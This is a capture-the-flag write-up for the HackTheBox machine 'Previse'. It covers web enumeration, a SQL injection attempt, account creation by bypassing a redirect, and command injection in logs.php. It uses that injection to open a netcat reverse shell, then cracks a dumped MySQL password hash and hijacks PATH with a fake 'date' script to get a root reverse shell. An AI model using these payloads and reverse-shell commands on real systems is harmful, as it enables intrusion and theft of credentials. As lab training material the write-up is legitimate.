---
title: HTB Previse - Writeup
date: "2021-12-25"
draft: true
tags: ["hackthebox", "machines", "web", "writeup"]
---

# Enumeration
## Initial Enumeration
#### Nmap Scans

Initial:

```text
PORT      STATE    SERVICE    REASON
22/tcp    open     ssh        syn-ack
80/tcp    open     http       syn-ack
```

Service Scan:

```text
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration: Port 80

#### Ffuf

common.txt

```text
                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
accounts.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
download.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
favicon.ico             [Status: 200, Size: 15400, Words: 15, Lines: 10]
footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
files.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
logs.php                [Status: 200, Size: 2224, Words: 486, Lines: 54]
logout.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
status.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
```

medium.txt

```bash
$ ffuf -u http://10.10.11.104/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -c -ic -of html -o http-medium.html
```

```text
css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```

#### SQL injections

`/login.php`
- None of the sql injections worked.
- `sqlmap` also did not work
- Request:
	```text
	POST /login.php HTTP/1.1
	Host: 10.10.11.104
	Content-Length: 27
	Cache-Control: max-age=0
	Upgrade-Insecure-Requests: 1
	Origin: http://10.10.11.104
	Content-Type: application/x-www-form-urlencoded
	User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	Sec-GPC: 1
	Referer: http://10.10.11.104/login.php
	Accept-Encoding: gzip, deflate
	Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
	Cookie: PHPSESSID=4natd10ok9pjvsrsuhr4ql0ktq
	Connection: close
	
	username='+OR+1=1;--&password='+OR+1=1;--
	```

# Initial Foothold

### /accounts.php

Request of `accounts.php` is redirected to -> `login.php`

But when intercepted with Burp, we have interesting results

![](/img/previse/Pasted%20image%2020211225134915.png)

If we send a post request, we can create a new user
![](/img/previse/Pasted%20image%2020211225134951.png)

#### Sending the POST request
Request:

![](/img/previse/Pasted%20image%2020211225135604.png)

Response:
![](/img/previse/Pasted%20image%2020211225135625.png)

So now we have a user with username and password as `fakebatman:fakebatman`

## Getting user shell

The logs file executes a python script and appends a delimiter that is parsed through a POST parameter

*logs.php*
```php
/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```

So when we send the delim=`;ping 10.10.14.33 -c 5` and we run `tcpdump` to check if we are actually receiving any pings, we get ping hits.

Appending the command:

![](/img/previse/Pasted%20image%2020211225175758.png)

And we get the ping hits:

```bash
$ sudo tcpdump -i tun0 icmp
```

![](/img/previse/Pasted%20image%2020211225180213.png)

### Getting a reverse shell (www-data)

Start a reverse shell

```bash
$ nc -nlvp 4444
```

Send the request

![](/img/previse/Pasted%20image%2020211225180452.png)

```http
delim=;nc+10.10.14.33+4444+-e+/bin/sh
```

And we get a reverse shell

![](/img/previse/Pasted%20image%2020211225180415.png)

### MySQL recon

```bash
$ mysql -u root -p
mysql> SELECT * FROM accounts;
SELECT * FROM accounts;
+----+---------------+------------------------------------+---------------------+
| id | username      | password                           | created_at          |
+----+---------------+------------------------------------+---------------------+
|  1 | m4lwhere      | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
```

Saving the hash into a file `m4lwhere.hash` and cracking the hash using hashcat

```bash
hashcat -m 500 -a 0 m4lwhere.hash /usr/share/wordlists/rockyou.txt
```

The cracked password

```text
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```

### Logging in using these creds
and hoping for a password reuse

```bash
$ ssh m4lwhere@10.10.11.104
```

and `ilovecody112235!` as password we get a SSH shell

![](/img/previse/Pasted%20image%2020211225183445.png)

# Post Exploit Enumeration
### sudo -l

```bash
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere:
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

*access_backup.sh*
```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

Absolute paths for `gzip` and `date` is not mentioned. 

### Creating a new file 

Going to `/tmp` directory and creating a `date` file with contents

*date*
```bash
nc 10.10.14.33 9001 -e /bin/bash
```

![](/img/previse/Pasted%20image%2020211225192245.png)

And then we add `tmp/` directory to the path

```bash
$ export PATH=tmp:/$PATH
```

Now we run our script

```bash
$ sudo /opt/scripts/access_backup.sh
```

And we get a shell on our reverse tcp listener
![](/img/previse/Pasted%20image%2020211225192210.png)